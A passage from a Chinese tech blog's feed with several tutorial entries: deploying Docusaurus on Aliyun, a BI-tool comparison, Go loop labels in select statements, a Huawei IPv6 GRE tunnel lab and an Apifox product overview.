title="二、创建Docusaurus应用"></a>二、创建Docusaurus应用</h3><ul><li>创建前端应用。打开快速开始 <a href="https://workbench.aliyun.com/app%EF%BC%8C%E6%89%BE%E5%88%B0">https://workbench.aliyun.com/app，找到</a> Docusaurus 点击创建「创建应用」按钮。</li></ul><p><img src="https://static.luozhinet.com/e5/fa1a2e3433d3ebfc714e0afd15fbbd" alt="file"></p><ul><li>云资源访问授权。如果您之前没有使用过云开发平台，会出现云资源授权管理的选项，往下拉出现直至同意授权的字样，点击「同意授权」后出现授权成功，点击进入「下一步」。</li></ul><p><img src="https://static.luozhinet.com/59/b9a04f6be5f750d9dfe68e407be665" alt="file"></p><ul><li>绑定Github账号。授权完成后选择来源仓库为Github，按照提示点击去绑定，绑定GitHub帐号，登录后并点击Authorize Aliyunworkben允许云开发平台构建、发布你的GitHub代码为可访问的网站。</li></ul><p><img src="https://static.luozhinet.com/a9/2047604c441c0e57c1de841b2d1b95" alt="file"></p><ul><li>选择fork好的“Docusaurus”代码仓库。选择第一步中的代码仓库，主干分支，并点击下一步。主干分支一般指的是代码的master或main等分支。</li></ul><p><img src="https://static.luozhinet.com/d0/42d4db50208c77540466d72b3d7671" alt="file"></p><p>填写基本信息，完成创建。填写基本信息并点击「完成」。成功后进入到应用详情和部署界面。</p><p><img src="https://static.luozhinet.com/be/908c62d32e2ca543327a1d5c6a2449" alt="file"></p><h3 id="三、在日常环境部署"><a href="#三、在日常环境部署" class="headerlink" title="三、在日常环境部署"></a>三、在日常环境部署</h3><ul><li>一键进行应用部署。在应用详情页面点击日常环境的「部署」按钮进行一键部署，部署状态变成绿色已部署以后可以点击访问部署网站查看效果。</li></ul><p><img src="https://static.luozhinet.com/3d/e28cbccbc3aa2c1b0720f84e1ae37f" alt="file"></p><ul><li>访问Docusaurus网站。日常环境的测试域名也是可以访问的，点击访问已部署网站按钮会出现一个弹出，点击弹出上的立即访问就能够访问已经部署好的站点了。在部署完成后，可以继续本地编码，并将代码push到应用的“基本信息”中对应的代码仓库内。</li></ul><p><img src="https://static.luozhinet.com/57/18f35e9a0b0be012f69b3070447d47" alt="file"></p><h2 id="多端应用一键上云"><a href="#多端应用一键上云" class="headerlink" title="多端应用一键上云"></a>多端应用一键上云</h2><p>现如今身处在随时会到来新状况的大环境下，做好自己便是在不安中树立了一颗屹立不倒的松树。作为开发者们每天都要面临新的代码、应用，保持随时学习的状态和能力也可让自己多一份安稳。阿里云云开发平台的初衷是为每一位开发者提供免费、便捷的云上研发工作平台，通过学习与实操演练两种模式，从入门到精通快速上手Serverless和云开发技术。0门槛全云端开发、随时随地在线协同、业界领先Serverless架构、行业应用一件初始化等特性也通过每次的实践伴随着你、我。</p><p>云原生应用、主机应用部署、前端应用部署三大板块的提供，供开发者们找到最合适自己神器，令开发工作事半功倍。其中满足IoT语音技能、小程序、H5应用等开发者低门槛应用开发的需求；也支持代码编译部署到ECS主机服务器的场景，帮助用户管理传统主机应用的能力；让前后端应用能够更高效地协同。平台将持续与开发者一起共同成长，帮忙开发者更好、更快以及更低成本的开发，多端的应用更加快速的上云。</p><p><img src="https://static.luozhinet.com/17/4e28fae9a84c1001802e10a41a5493" alt="file"></p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应用 </tag>
            
            <tag> 服务 </tag>
            
            <tag> 架构 </tag>
            
            <tag> 服务器 </tag>
            
            <tag> 免费 </tag>
            
            <tag> 账号 </tag>
            
            <tag> 机器 </tag>
            
            <tag> 营销 </tag>
            
            <tag> 方法 </tag>
            
            <tag> 文件 </tag>
            
            <tag> run </tag>
            
            <tag> 目录 </tag>
            
            <tag> 测试 </tag>
            
            <tag> 域名 </tag>
            
            <tag> auto </tag>
            
            <tag> 部署 </tag>
            
            <tag> docs </tag>
            
            <tag> docusaurus </tag>
            
            <tag> file </tag>
            
            <tag> 创建 </tag>
            
            <tag> json </tag>
            
            <tag> npm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>比起网易有数BI，也许这款数据可视化软件更适合你！</title>
      <link href="/posts/82e546ae80af/"/>
      <url>/posts/82e546ae80af/</url>
      
        <content type="html"><![CDATA[<p>有数BI是网易推出的面向企业客户的可视化敏捷BI产品。拥有数据填报和自助式商业智能分析产品，提供网页端和手机端应用，帮助客户快速实现数据填报、多维分析、大数据探索、实时大数据展示和成员分享。</p><p>山海鲸可视化是一款支持Windows&#x2F;MacOS&#x2F;Linux全平台的数据可视化大屏软件，可以实现大屏的编辑、查看、云托管和分享，通过内置丰富的大屏模板，在线数据编辑和替换，可以一键创建大屏，是目前操作最简单易上手的数据可视化大屏软件。</p><p>同样作为数据可视化工具，网易有数BI和山海鲸可视化在操作过程给使用者的体验大有不同，主要体现在以下四个方面：</p><p><strong>一、大屏模板</strong></p><p>1.有数BI内提供的模板大屏样式少且单调，并不能适用于用户对于可视化大屏的多样需求，影响用户体验；</p><p> <img src="https://static.luozhinet.com/3b/bbaebc206028dadb43f5ef19458b29"></p><p>2.山海鲸可视化内置丰富的大屏模板，多种大屏尺寸和样式，2D、3D模板可供选择，可以满足用户多种需求。</p><p> <img src="https://static.luozhinet.com/d5/f8414a7c2f9a953703466ceb24c635"></p><p><strong>二、大屏组件</strong></p><p>1.有数BI的大屏编辑功能偏重于数据的分析而不是可视化呈现，有数BI在搭建数据的载体——可视化组件——方面种类和形式都不够丰富；</p><p> <img src="https://static.luozhinet.com/1d/435a6836cacb28874c39718df352f8"></p><p>2.山海鲸可视化提供大量可视化组件，在支持自定义组件和自定义动画的同时，提供了多种3D组件（3D城市、3D地图等）以及导入3D模型的功能，并且支持组件搜索。</p><p> <img src="https://static.luozhinet.com/84/2cad6ae9dea636533a572754354ea6"></p><p><strong>三、安全性</strong></p><p>1.有数BI是SAAS平台，SAAS平台不需要下载软件，直接在浏览器上就可以操作，但是用户需要将数据上传至对方服务器，安全性方面存在风险；</p><p>2.山海鲸可视化是一个C端软件，安装之后所有操作都在本地终端进行，和SAAS相比更加安全。</p><p><strong>四、价格</strong></p><p>1.有数BI支持注册后免费试用，但免费功能较少且后续套餐复杂，及买断式私有化部署价格昂贵；</p><p> <img src="https://static.luozhinet.com/76/33d80c3f977c4ea52b9eae4d6b704d"></p><p>2.山海鲸可视化注册后即可免费使用，所有版本都是本地部署一键自助部署，数据更安全，性价比高。</p><p> <img src="https://static.luozhinet.com/8c/e5e043b142d395d6416fb0be75e7a4"></p><p>以上就是网易有数BI和山海鲸可视化这两款数据可视化工具的简单对比，感兴趣的朋友可以都尝试一下，毕竟“实践是检验真理的唯一标准”，而且都是免费试用的产品。</p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作 </tag>
            
            <tag> 服务器 </tag>
            
            <tag> 免费 </tag>
            
            <tag> 部署 </tag>
            
            <tag> 客户 </tag>
            
            <tag> 搜索 </tag>
            
            <tag> 山海鲸 </tag>
            
            <tag> 大屏 </tag>
            
            <tag> 可视化 </tag>
            
            <tag> 有数 </tag>
            
            <tag> 组件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang 循环中的 switch 里的 break 与 continue</title>
      <link href="/posts/d3a9bccac183/"/>
      <url>/posts/d3a9bccac183/</url>
      
        <content type="html"><![CDATA[<p>  最近在测试服务器的 UDP 接口, 最开始我使用 python 协程制造负载, 但是单机负载一直不高. 刚好最近在学习 golang 相关的内容, 就用 golang 实现了一个 UDP 施压的程序. 在编写 golang 程序的过程中经常要用到 goroutine 与 channel. 读取 channel 中的内容是阻塞的, 而且官方似乎没有给出相关的超时处理, 因此需要程序员做相关的超时处理. 一般用 select + time.After() 进行超时处理. 代码如下:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">go</span> sendToMain()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;run for&quot;</span>)</span><br><span class="line"><span class="comment">//两个 case. 一个是从管道里面读数据, 另一个是 0.5s 执行.</span></span><br><span class="line"><span class="comment">//当 0.5 秒内未在第一个 case 读取数据时执行第二个 case.</span></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> send_data := &lt;-send_to_main: <span class="comment">// 阻塞直到管道可读</span></span><br><span class="line">fmt.Println(<span class="string">&quot;run send_data := &lt;-send_to_main case&quot;</span>)</span><br><span class="line"><span class="keyword">switch</span> send_data &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> &lt;-time.After(<span class="number">500</span> * time.Millisecond): <span class="comment">// 0.5s 后管道还不可读则执行这个 case</span></span><br><span class="line">fmt.Println(<span class="string">&quot;run &lt;-time.After(500 * time.Millisecond) case&quot;</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  运行之后我发现 switch 里的 continue 可以跳出本次循环, 但是 select 里的 break 只会结束本次循环, 并不会跳出最外层的 for 循环, 难道外循环还需要些循环控制相关的逻辑吗? 查询相关资料后我发现并不用, 只需在 for 循环上加一个标签, break 到这个标签即可. 代码如下:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> send_to_main = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sendToMain</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">send_to_main &lt;- i</span><br><span class="line">time.Sleep(<span class="number">1</span> * time.Second) <span class="comment">//阻塞 1 秒</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">go</span> sendToMain()</span><br><span class="line"></span><br><span class="line">SELECT:</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;run for&quot;</span>)</span><br><span class="line"><span class="comment">//两个 case. 一个是从管道里面读数据, 另一个是 0.5s 执行.</span></span><br><span class="line"><span class="comment">//当 0.5 秒内未在第一个 case 读取数据时执行第二个 case.</span></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> send_data := &lt;-send_to_main: <span class="comment">// 阻塞直到管道可读</span></span><br><span class="line">fmt.Println(<span class="string">&quot;run send_data := &lt;-send_to_main case&quot;</span>)</span><br><span class="line"><span class="keyword">switch</span> send_data &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="comment">// continue SELECT</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> &lt;-time.After(<span class="number">500</span> * time.Millisecond): <span class="comment">// 0.5s 后管道还不可读则执行这个 case</span></span><br><span class="line">fmt.Println(<span class="string">&quot;run &lt;-time.After(500 * time.Millisecond) case&quot;</span>)</span><br><span class="line"><span class="keyword">break</span> SELECT</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我刚刚接触 golang 写的比较简陋, 园里的大佬肯定有更好的方法, 希望各位大佬不吝赐教.</p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
            <tag> run </tag>
            
            <tag> 测试 </tag>
            
            <tag> 负载 </tag>
            
            <tag> case </tag>
            
            <tag> golang </tag>
            
            <tag> select </tag>
            
            <tag> udp </tag>
            
            <tag> channel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HuaWei配置IPv6 GRE</title>
      <link href="/posts/4640b12d803b/"/>
      <url>/posts/4640b12d803b/</url>
      
        <content type="html"><![CDATA[<h1 id="IPv6-over-IPv4-GRE封装隧道"><a href="#IPv6-over-IPv4-GRE封装隧道" class="headerlink" title="IPv6 over IPv4 GRE封装隧道"></a>IPv6 over IPv4 GRE封装隧道</h1><p><img src="https://static.luozhinet.com/2f/c6592e7ccb01ea4714a1267c00c87a" alt="image"></p><h2 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标:"></a>实验目标:</h2><p>该实验参考了华为官网案例配置<br><a href="https://support.huawei.com/enterprise/zh/doc/EDOC1000097307/478eeed1">https://support.huawei.com/enterprise/zh/doc/EDOC1000097307/478eeed1</a></p><p>R1与R2之间通过创建一条IPv6 over IPv4 的GRE隧道实现双方ipv6网络互访。</p><h3 id="IP地址表"><a href="#IP地址表" class="headerlink" title="IP地址表:"></a>IP地址表:</h3><table><thead><tr><th>设备</th><th>接口</th><th>IP地址</th></tr></thead><tbody><tr><td>R1</td><td>G0&#x2F;0&#x2F;0</td><td>12.1.1.1&#x2F;24</td></tr><tr><td>R1</td><td>G0&#x2F;0&#x2F;1</td><td>2002::1&#x2F;64</td></tr><tr><td>R1</td><td>Tunnel 0&#x2F;0&#x2F;1</td><td>::12.1.1.1&#x2F;96</td></tr><tr><td>R2</td><td>G0&#x2F;0&#x2F;1</td><td>2001::1&#x2F;64</td></tr><tr><td>R2</td><td>G0&#x2F;0&#x2F;2</td><td>12.1.2.1&#x2F;24</td></tr><tr><td>R2</td><td>Tunnel 0&#x2F;0&#x2F;1</td><td>::12.1.2.1&#x2F;96</td></tr><tr><td>PC1</td><td>E0&#x2F;0&#x2F;1</td><td>2002::2&#x2F;64</td></tr><tr><td>PC2</td><td>E0&#x2F;0&#x2F;1</td><td>2001::2&#x2F;64</td></tr></tbody></table><h3 id="隧道接口"><a href="#隧道接口" class="headerlink" title="隧道接口:"></a>隧道接口:</h3><table><thead><tr><th>设备</th><th>隧道接口</th><th>模式</th><th>隧道源地址</th><th>隧道目标地址</th></tr></thead><tbody><tr><td>R1</td><td>Tunnel 0&#x2F;0&#x2F;1</td><td>GRE</td><td>12.1.1.1</td><td>12.1.2.1</td></tr><tr><td>R2</td><td>Tunnel 0&#x2F;0&#x2F;1</td><td>GRE</td><td>12.1.2.1</td><td>12.1.1.1</td></tr></tbody></table><h3 id="配置步骤"><a href="#配置步骤" class="headerlink" title="配置步骤:"></a>配置步骤:</h3><ul><li>配置IPv4与IPv6双协议栈</li><li>创建gre隧道</li><li>实现路由互通</li></ul><p>R1和R2之间的路由器用来模拟链路在Internet上运行，简单的给两个接口配置IP地址就好了。</p><h2 id="双协议栈配置"><a href="#双协议栈配置" class="headerlink" title="双协议栈配置:"></a>双协议栈配置:</h2><h3 id="R1"><a href="#R1" class="headerlink" title="R1:"></a>R1:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;sys</span><br><span class="line">[Huawei]sys R1</span><br><span class="line">[R1]ipv6      #开启全局ipv6</span><br><span class="line">[R1]int g0/0/0</span><br><span class="line">[R1-GigabitEthernet0/0/0]ip add 12.1.1.1 24</span><br><span class="line">[R1-GigabitEthernet0/0/0]int g0/0/1</span><br><span class="line">[R1-GigabitEthernet0/0/1]ipv6 enable      #接口启用ipv6协议</span><br><span class="line">[R1-GigabitEthernet0/0/1]ipv6 address 2002::1/64      #配置ipv6地址</span><br><span class="line">[R1-GigabitEthernet0/0/1]quit</span><br><span class="line">[R1]</span><br></pre></td></tr></table></figure><h3 id="R2"><a href="#R2" class="headerlink" title="R2:"></a>R2:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;sys</span><br><span class="line">[Huawei]sys R2</span><br><span class="line">[R2]ipv6</span><br><span class="line">[R2]int g0/0/2</span><br><span class="line">[R2-GigabitEthernet0/0/2]ip add 12.1.2.1 24</span><br><span class="line">[R2-GigabitEthernet0/0/2]int g0/0/1</span><br><span class="line">[R2-GigabitEthernet0/0/1]ipv6 enable</span><br><span class="line">[R2-GigabitEthernet0/0/1]ipv6 address 2001::1/64</span><br><span class="line">[R2-GigabitEthernet0/0/1]quit</span><br><span class="line">[R2]</span><br></pre></td></tr></table></figure><h2 id="创建GRE隧道"><a href="#创建GRE隧道" class="headerlink" title="创建GRE隧道:"></a>创建GRE隧道:</h2><h3 id="R1-1"><a href="#R1-1" class="headerlink" title="R1:"></a>R1:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[R1]int tunnel 0/0/1      #创建隧道接口tunnel 0/0/1</span><br><span class="line">[R1-Tunnel0/0/1]ipv6 enable     #接口启用ipv6协议</span><br><span class="line">[R1-Tunnel0/0/1]tunnel-protocol gre     #隧道封装模式更改为采用通用路由封装（GRE）</span><br><span class="line">[R1-Tunnel0/0/1]ipv6 address ::12.1.1.1/96      #配置ipv6地址</span><br><span class="line">[R1-Tunnel0/0/1]source 12.1.1.1     #隧道源地址</span><br><span class="line">[R1-Tunnel0/0/1]destination 12.1.2.1      #隧道目标地址</span><br><span class="line">[R1-Tunnel0/0/1]quit</span><br></pre></td></tr></table></figure><h3 id="R2-1"><a href="#R2-1" class="headerlink" title="R2:"></a>R2:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[R2]int tun 0/0/1</span><br><span class="line">[R2-Tunnel0/0/1]ipv6 enable </span><br><span class="line">[R2-Tunnel0/0/1]tunnel-protocol gre</span><br><span class="line">[R2-Tunnel0/0/1]ipv6 address ::12.1.2.1/96</span><br><span class="line">[R2-Tunnel0/0/1]source 12.1.2.1</span><br><span class="line">[R2-Tunnel0/0/1]destination 12.1.1.1</span><br><span class="line">[R2-Tunnel0/0/1]quit</span><br></pre></td></tr></table></figure><h2 id="路由互通"><a href="#路由互通" class="headerlink" title="路由互通:"></a>路由互通:</h2><h3 id="R1-2"><a href="#R1-2" class="headerlink" title="R1:"></a>R1:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R1]ip route-static 0.0.0.0 0 12.1.1.2</span><br><span class="line">[R1]ipv6 route-static 2001:: 64 Tunnel 0/0/1      #隧道静态路由</span><br></pre></td></tr></table></figure><h3 id="R2-2"><a href="#R2-2" class="headerlink" title="R2:"></a>R2:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R2]ip route-static 0.0.0.0 0 12.1.2.2</span><br><span class="line">[R2]ipv6 route-static 2002:: 64 Tunnel 0/0/1      #隧道静态路由</span><br></pre></td></tr></table></figure><h2 id="结果测试"><a href="#结果测试" class="headerlink" title="结果测试:"></a>结果测试:</h2><h3 id="首先测试R1与R2之间IPv4的互通（这里不通后面的测试就失败了）"><a href="#首先测试R1与R2之间IPv4的互通（这里不通后面的测试就失败了）" class="headerlink" title="首先测试R1与R2之间IPv4的互通（这里不通后面的测试就失败了）:"></a>首先测试R1与R2之间IPv4的互通（这里不通后面的测试就失败了）:</h3><p><img src="https://static.luozhinet.com/f3/9a6ce27a4cdac3ac469343cffa723d" alt="image"></p><h3 id="R1、R2隧道状态"><a href="#R1、R2隧道状态" class="headerlink" title="R1、R2隧道状态:"></a>R1、R2隧道状态:</h3><p><img src="https://static.luozhinet.com/d8/709ec6688cf3b8104fa19d50184e9a" alt="image"></p><p><img src="https://static.luozhinet.com/49/17af236325c1e8a9c9bda8c19c8bfb" alt="image"></p><h3 id="验证通过GRE访问"><a href="#验证通过GRE访问" class="headerlink" title="验证通过GRE访问:"></a>验证通过GRE访问:</h3><p><img src="https://static.luozhinet.com/63/0124f466d6cd9396111382a86fc00a" alt="image"></p><p><img src="https://static.luozhinet.com/d2/96767e410a4abd0dcd4055e73a03c8" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 测试 </tag>
            
            <tag> auto </tag>
            
            <tag> 地址 </tag>
            
            <tag> int </tag>
            
            <tag> image </tag>
            
            <tag> ipv6 </tag>
            
            <tag> gre </tag>
            
            <tag> 隧道 </tag>
            
            <tag> tunnel </tag>
            
            <tag> 12.1.1.1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一款开发者必备的接口管理工具！</title>
      <link href="/posts/b1579a861a7e/"/>
      <url>/posts/b1579a861a7e/</url>
      
        <content type="html"><![CDATA[<p>​</p><blockquote><p>作为软件开发从业者，API 调试是必不可少的一项技能，在这方面 Postman 做的非常出色。但是在整个软件开发过程中，API 调试只是其中的一部分，还有很多事情 Postman 无法完成，或者<code>无法高效完成</code>，比如：API 文档定义、API Mock、API 自动化测试等等。Apifox 就是为了解决这个问题而生的。</p></blockquote><h2 id="接口管理现状"><a href="#接口管理现状" class="headerlink" title="接口管理现状"></a>接口管理现状</h2><h3 id="一、常用解决方案"><a href="#一、常用解决方案" class="headerlink" title="一、常用解决方案"></a>一、常用解决方案</h3><ol><li>使用 Swagger 管理 API 文档</li><li>使用 Postman 调试 API</li><li>使用 MockJs 等工具 Mock API 数据</li><li>使用 JMeter 做 API 自动化测试</li></ol><h3 id="二、存在的问题"><a href="#二、存在的问题" class="headerlink" title="二、存在的问题"></a>二、存在的问题</h3><p>维护不同工具之间数据一致性非常困难、低效。并且这里不仅仅是工作量的问题，更大的问题是多个系统之间数据不一致，导致协作低效、频繁出问题，开发测试人员痛苦不堪。</p><ol><li>开发人员在 Swagger 定义好文档后，接口调试的时候还需要去 Postman 再定义一遍。</li><li>前端开发 Mock 数据的时候又要去 MockJs 定义一遍，还需要手动设置 Mock 规则。</li><li>测试人员需要去 JMeter 再定义一遍。</li><li>前端根据 MockJs Mock 出来的数据开发完，后端根据 Swagger 定义的接口文档开发完，各自都试测试通过了，本以为可以马上上线，结果一对接发现各种问题：<ul><li>开发过程中接口变更了，只修改了 Swagger，但是没有及时同步修改 MockJs。</li><li>后端开发的接口数据类型和文档不一致，肉眼难以发现问题。</li></ul></li><li>同样，测试在 JMeter 写好的测试用例，真正运行的时候也会发现各种不一致。</li><li>时间久了，各种不一致会越来越严重。</li></ol><h2 id="Apifox-解决方案"><a href="#Apifox-解决方案" class="headerlink" title="Apifox 解决方案"></a>Apifox 解决方案</h2><p><img src="https://static.luozhinet.com/a2/b78ae063bb732d3702baa8fddbea7f">​</p><p><img src="https://static.luozhinet.com/e3/95d06457ce24564035d39f315b2682" title="点击并拖拽以移动">编辑</p><h3 id="一、如何解决这些问题"><a href="#一、如何解决这些问题" class="headerlink" title="一、如何解决这些问题"></a>一、如何解决这些问题</h3><p>1、Apifox 定位</p><p><code>Apifox = Postman + Swagger + Mock + JMeter</code></p><p>Apifox 是 API 文档、API 调试、API Mock、API 自动化测试一体化协作平台。</p><p>通过一套系统、一份数据，解决多个系统之间的数据同步问题。只要定义好接口文档，接口调试、数据 Mock、接口测试就可以直接使用，无需再次定义；接口文档和接口开发调试使用同一个工具，接口调试完成后即可保证和接口文档定义完全一致。高效、及时、准确！</p><p>2、Apifox 宗旨</p><p>节省研发团队的每一分钟！</p><p>3、Apifox 功能</p><ol><li><strong>接口设计</strong>：Apifox 接口文档遵循 <a href="https://openapi.apifox.cn/" title="OpenApi">OpenApi</a> 3.0 (原 Swagger)、<a href="https://json-schema.apifox.cn/" title="JSON Schema">JSON Schema</a> 规范的同时，提供了非常好用的<code>可视化</code>文档管理功能，零学习成本，非常高效。并且支持在线分享接口文档。</li><li><strong>数据模型</strong>：可复用的数据结构，定义接口<code>返回数据结构</code>及<code>请求参数数据结构</code>（仅 JSON 和 XML 模式）时可直接引用。支持模型直接嵌套引用，直接 JSON&#x2F;XML 智能导入，支持 oneOf、allOf 等高级组合模式。</li><li><strong>接口调试</strong>：Postman 有的功能，比如环境变量、前置&#x2F;后置脚本、Cookie&#x2F;Session 全局共享 等功能，Apifox 都有，并且比 Postman 更高效好用。接口运行完之后点击<code>保存为用例</code>按钮，即可生成<code>接口用例</code>，后续可直接运行接口用例，无需再输入参数，非常方便。自定义脚本 100% 兼容 Postman 语法，并且支持运行 javascript、java、python、php、js、BeanShell、go、shell、ruby、lua 等各种语言代码。</li><li><strong>接口用例</strong>：通常一个接口会有多种情况用例，比如<code>参数正确</code>用例、<code>参数错误</code>用例、<code>数据为空</code>用例、<code>不同数据状态</code>用例等等。运行接口用例时会自动校验数据正确性，用接口用例来调试接口非常高效。</li><li><strong>接口数据 Mock</strong>：内置 <a href="http://mockjs.com/" title="Mock.js">Mock.js</a> 规则引擎，非常方便 mock 出各种数据，并且可以在定义数据结构的同时写好 mock 规则。支持添加“期望”，根据请求参数返回不同 mock 数据。最重要的是 Apifox <code>零配置</code> 即可 Mock 出非常人性化的数据，具体在本文后面介绍。</li><li><strong>数据库操作</strong>：支持读取数据库数据，作为接口请求参数使用。支持读取数据库数据，用来校验(断言)接口请求是否成功。</li><li><strong>接口自动化测试</strong>：提供接口集合测试，可以通过选择接口（或接口用例）快速创建测试集。目前接口自动化测试更多功能还在开发中，敬请期待！目标是： JMeter 有的功能基本都会有，并且要更好用。</li><li><strong>快捷调试</strong>：类似 Postman 的接口调试方式，主要用途为临时调试一些<code>无需文档化</code>的接口，无需提前定义接口即可快速调试。</li><li><strong>代码生成</strong>：根据接口及数据数据模型定义，系统自动生成<code>接口请求代码</code>、<code>前端业务代码</code>及<code>后端业务代码</code>。</li><li><strong>团队协作</strong>：Apifox 天生就是为团队协作而生的，接口云端实时同步更新，成熟的<code>团队/项目/成员权限</code>管理，满足各类企业的需求。</li></ol><h3 id="二、Apifox-做的不仅仅是数据打通"><a href="#二、Apifox-做的不仅仅是数据打通" class="headerlink" title="二、Apifox 做的不仅仅是数据打通"></a>二、Apifox 做的不仅仅是数据打通</h3><p>如果你认为 Apifox 只做了数据打通，来提升研发团队的效率，那就错了。Apifox 还做了非常多的创新，来提升开发人员的效率。</p><p>1、接口支持“用例管理”</p><p>通常一个接口会有多种情况用例，比如 <code>正确用例</code> <code>参数错误用例</code> <code>数据为空用例</code> <code>不同数据状态用例</code>。定义接口的时候定义好这些不同状态的用例，接口调试的时候直接运行，非常高效。</p><p>2、“数据模型”定义、引用</p><p>可以独立定义数据模型，接口定义时可以直接引用数据模型，数据模型之间也可以相互引用。同样的数据结构，只需要定义一次即可多处使用；修改的时候只需要修改一处，多处实时更新，避免不一致。</p><p>3、调试时“自动校验”数据结构</p><p>使用 Apifox 调试接口的时候，系统会根据接口文档里的定义，自动校验返回的数据结构是否正确，无需通过肉眼识别，也无需手动写断言脚本检测，非常高效！</p><p><img src="https://static.luozhinet.com/de/5d35da7980a259783d1dab68de9bf8">​</p><p><img src="https://static.luozhinet.com/e3/95d06457ce24564035d39f315b2682" title="点击并拖拽以移动">编辑</p><p>4、“可视化”设置断言</p><p>设置断言：</p><p><img src="https://static.luozhinet.com/5f/03dbffdbc44887b19f5583c4f579e0">​</p><p><img src="https://static.luozhinet.com/e3/95d06457ce24564035d39f315b2682" title="点击并拖拽以移动">编辑</p><p>运行后，查看断言结果：</p><p><img src="https://static.luozhinet.com/cd/77f37b90791e75a47981f71abdaedc">​</p><p><img 